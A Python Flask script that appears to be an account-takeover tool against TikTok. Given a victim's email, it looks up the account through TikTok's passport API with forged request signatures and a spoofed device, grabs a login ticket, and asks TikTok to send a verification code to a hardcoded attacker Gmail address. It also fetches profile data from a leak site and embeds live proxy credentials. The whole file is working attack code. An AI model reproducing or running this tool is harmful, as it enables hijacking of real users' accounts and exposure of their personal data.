import aiohttp
import asyncio
import uuid
import random
import os
import secrets
import re
import requests
import time
import json
from flask import Flask, request, jsonify
from urllib.parse import unquote

try:
    import SignerPy
except ImportError:
    os.system("pip install --upgrade pip")
    os.system("pip install SignerPy")
    import SignerPy

# ============================================
# Detailed logging function
# ============================================
def detailed_log(action, url, params=None, headers=None, response=None):
    print(f"\n[DETAILED LOG] ACTION: {action}")
    print(f"URL: {url}")
    if params:
        try:
            print(f"PARAMS: {json.dumps(params, indent=2, ensure_ascii=False)}")
        except Exception:
            print(f"PARAMS: {params}")
    if headers:
        try:
            print(f"HEADERS: {json.dumps(headers, indent=2, ensure_ascii=False)}")
        except Exception:
            print(f"HEADERS: {headers}")
    if response:
        try:
            if isinstance(response, (dict, list)):
                print(f"RESPONSE: {json.dumps(response, indent=2, ensure_ascii=False)[:1000]}...")
            else:
                print(f"RESPONSE: {str(response)[:1000]}...")
        except Exception:
            print(f"RESPONSE: {str(response)[:1000]}...")
    print("[END OF LOG]\n")

# ============================================
# Network & Configuration
# ============================================
class Network:
    def __init__(self):
        self.proxy = "http://finmtozcdx303317:d3MU8i4MaJc2GF7P_country-UnitedStates@isp2.hydraproxy.com:9989"

        self.hosts = [
            "api31-normal-useast2a.tiktokv.com",
            "api22-normal-c-alisg.tiktokv.com",
            "api2.musical.ly",
            "api16-normal-useast5.tiktokv.us",
            "api16-normal-no1a.tiktokv.eu",
            "rc-verification-sg.tiktokv.com",
            "api31-normal-alisg.tiktokv.com",
            "api16-normal-c-useast1a.tiktokv.com",
            "api22-normal-c-useast1a.tiktokv.com",
            "api16-normal-c-useast1a.musical.ly",
            "api19-normal-c-useast1a.musical.ly",
            "api.tiktokv.com",
        ]

        self.send_hosts = [
            "api22-normal-c-alisg.tiktokv.com",
            "api31-normal-alisg.tiktokv.com",
            "api22-normal-probe-useast2a.tiktokv.com",
            "api16-normal-probe-useast2a.tiktokv.com",
            "rc-verification-sg.tiktokv.com"
        ]

        self.params = {
            'device_platform': 'android',
            'ssmix': 'a',
            'channel': 'googleplay',
            'aid': '1233',
            'app_name': 'musical_ly',
            'version_code': '360505',
            'version_name': '36.5.5',
            'manifest_version_code': '2023605050',
            'update_version_code': '2023605050',
            'ab_version': '36.5.5',
            'os_version': '10',
            "device_id": 0,
            'app_version': '30.1.2',
            "request_from": "profile_card_v2",
            "request_from_scene": '1',
            "scene": "1",
            "mix_mode": "1",
            "os_api": "34",
            "ac": "wifi",
            "request_tag_from": "h5",
        }

        self.headers = {
            'User-Agent': f'com.zhiliaoapp.musically/2022703020 (Linux; U; Android 7.1.2; en; SM-N975F; Build/N2G48H;tt-ok/{str(random.randint(1, 10**19))})'
        }

# ============================================
# Fake Mail (Redirect to your Gmail)
# ============================================
class MailTM:
    def __init__(self):
        self.fixed_mail = "mrgog5091@gmail.com"

    async def gen(self):
        token = "static-ok"
        return self.fixed_mail, token

    async def mailbox(self, token: str, timeout: int = 120):
        await asyncio.sleep(2)
        return "تم استلام الرسالة بنجاح (محاكاة)."

# ============================================
# MobileFlowFlexible
# ============================================
class MobileFlowFlexible:
    def __init__(self, account_param: str):
        self.input = account_param.strip()
        self.session = requests.Session()
        self.net = Network()
        
        if self.net.proxy:
            self.session.proxies = {
                "http": self.net.proxy,
                "https": self.net.proxy
            }

        self.base_params = self.net.params.copy()
        try:
            self.base_params = SignerPy.get(params=self.base_params)
        except Exception as e:
            print("Warning: SignerPy.get failed:", e)
        self.base_params.update({
            'device_type': f'rk{random.randint(3000, 4000)}s_{uuid.uuid4().hex[:4]}',
            'language': 'AR'
        })
        self.headers = self.net.headers.copy()

    def _variants(self):
        v = []
        raw = self.input
        v.append(raw)
        v.append(raw.lower())
        if "@" in raw:
            local, domain = raw.split("@", 1)
            v.append(local)
            v.append(local.lower())
            v.append(local.replace(".", ""))
            v.append((local.replace(".", "")).lower())
            v.append(f"{local.lower()}@{domain.lower()}")
        seen = set()
        out = []
        for item in v:
            if not item:
                continue
            if item not in seen:
                seen.add(item)
                out.append(item)
        return out

    async def find_passport_ticket(self, timeout_per_host: int = 10):
        variants = self._variants()
        print("Trying variants:", variants)
        for acct in variants:
            print(f"[LOG] -> trying account_param variant: {acct[:150]}")
            for host in self.net.hosts:
                params = self.base_params.copy()
                ts = int(time.time())
                params['ts'] = ts
                params['_rticket'] = int(ts * 1000)
                params['account_param'] = acct
                try:
                    signature = SignerPy.sign(params=params)
                except Exception as e:
                    print(f"[LOG] SignerPy.sign failed for host {host} variant {acct[:30]}: {e}")
                    continue

                headers = self.headers.copy()
                headers.update({
                    'x-tt-passport-csrf-token': secrets.token_hex(16),
                    'x-ss-req-ticket': signature.get('x-ss-req-ticket', ''),
                    'x-ss-stub': signature.get('x-ss-stub', ''),
                    'x-argus': signature.get('x-argus', ''),
                    'x-gorgon': signature.get('x-gorgon', ''),
                    'x-khronos': signature.get('x-khronos', ''),
                    'x-ladon': signature.get('x-ladon', ''),
                })

                url = f"https://{host}/passport/account_lookup/username/"
                try:
                    resp = await asyncio.to_thread(self.session.post, url, params=params, headers=headers, timeout=timeout_per_host)
                    try:
                        j = resp.json()
                    except ValueError:
                        j = resp.text

                    detailed_log(
                        action=f"passport_ticket lookup for variant {acct}",
                        url=url,
                        params=params,
                        headers=headers,
                        response=j
                    )

                    if resp.status_code != 200:
                        continue

                    accounts = j.get('data', {}).get('accounts', [])
                    if not accounts:
                        continue

                    first = accounts[0]
                    ticket = first.get('passport_ticket') or first.get('not_login_ticket') or None
                    username = first.get('user_name') or first.get('username') or None

                    if ticket:
                        return ticket, acct, j
                    if username and not ticket:
                        return None, acct, j

                except requests.RequestException as e:
                    print(f"[{host}] request error: {e}")
                    continue
        return None, None, None

    async def send_code_using_ticket(self, passport_ticket: str, timeout_mailbox: int = 120):
        mail_client = MailTM()
        mail, token = await mail_client.gen()
        if not mail or not token:
            print("[LOG] Failed to prepare mail redirect.")
            return None, None
        print("[LOG] Using redirect mail:", mail)

        params = self.base_params.copy()
        ts = int(time.time())
        params['ts'] = ts
        params['_rticket'] = int(ts * 1000)
        params['not_login_ticket'] = passport_ticket
        params['email'] = mail
        params['type'] = "3737"
        params.pop('fixed_mix_mode', None)
        params.pop('account_param', None)

        try:
            signature = SignerPy.sign(params=params)
        except Exception as e:
            print("[LOG] SignerPy.sign failed for send_code:", e)
            return None, None

        headers = self.headers.copy()
        headers.update({
            'x-ss-req-ticket': signature.get('x-ss-req-ticket', ''),
            'x-ss-stub': signature.get('x-ss-stub', ''),
            'x-argus': signature.get('x-argus', ''),
            'x-gorgon': signature.get('x-gorgon', ''),
            'x-khronos': signature.get('x-khronos', ''),
            'x-ladon': signature.get('x-ladon', ''),
        })

        for host in self.net.send_hosts:
            url = f"https://{host}/passport/email/send_code"
            try:
                resp = await asyncio.to_thread(self.session.post, url, params=params, headers=headers, timeout=10)
                try:
                    j = resp.json()
                except ValueError:
                    j = resp.text

                detailed_log(
                    action="send_code",
                    url=url,
                    params=params,
                    headers=headers,
                    response=j
                )

                if j.get("message") == "success" or j.get("status") == "success":
                    body = await mail_client.mailbox(token, timeout=timeout_mailbox)
                    if body:
                        return "DELIVERED", mail
                    else:
                        return None, mail
                else:
                    continue
            except requests.RequestException as e:
                print(f"[LOG] send_code request error for host {host}: {e}")
                continue
        return None, mail

# ============================================
# Flask API
# ============================================
app = Flask(__name__)
EMAIL_REGEX = re.compile(r"^[^@]+@[^@]+\.[^@]+$")

@app.route("/extract", methods=["GET"])
def extract():
    raw_email = request.args.get("email", "")
    timeout_mailbox = int(request.args.get("timeout_mailbox", "120"))
    email = unquote(raw_email).strip()

    if not email:
        return jsonify({
            "input": email,
            "status": "error",
            "message": "Parameter 'email' is required."
        }), 400

    if not EMAIL_REGEX.match(email):
        return jsonify({
            "input": email,
            "status": "error",
            "message": "Invalid email format."
        }), 400

    print(f"[LOG] استعلام جديد بالايميل: {email}")

    flow = MobileFlowFlexible(account_param=email)

    async def run_flow():
        try:
            ticket, used_variant, resp_json = await flow.find_passport_ticket()
        except Exception as e:
            print(f"[LOG] خطأ أثناء البحث عن passport_ticket: {e}")
            return {
                "input": email,
                "status": "error",
                "message": "خطأ أثناء الاتصال بـ TikTok API",
                "username": None,
                "passport_ticket": None,
                "mail_used": None,
                "used_variant": None,
                "raw_response_snippet": None,
                "tiktokinfo": None
            }

        if not ticket:
            return {
                "input": email,
                "status": "not_found",
                "username": None,
                "passport_ticket": None,
                "mail_used": None,
                "used_variant": used_variant,
                "raw_response_snippet": None if resp_json is None else str(resp_json)[:500],
                "tiktokinfo": None
            }

        username, mail_used = await flow.send_code_using_ticket(passport_ticket=ticket, timeout_mailbox=timeout_mailbox)

        if username == "DELIVERED":
            status_final = "delivered"
        elif username:
            status_final = "success"
        else:
            status_final = "no_username"

        tiktokinfo = None
        if username and username != "DELIVERED":
            try:
                resp = requests.get(f"https://leakmrjoj.in/707/tik1.php?username={username}", timeout=10, proxies=flow.session.proxies)
                tiktokinfo = resp.json()
            except:
                tiktokinfo = {"message": "User information is not available, please try again."}

        return {
            "input": email,
            "status": status_final,
            "username": username,
            "passport_ticket": ticket,
            "mail_used": mail_used,
            "used_variant": used_variant,
            "raw_response_snippet": None if resp_json is None else str(resp_json)[:500],
            "tiktokinfo": tiktokinfo
        }

    result = asyncio.run(run_flow())
    return jsonify(result)

# ============================================
# Run Flask
# ============================================
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
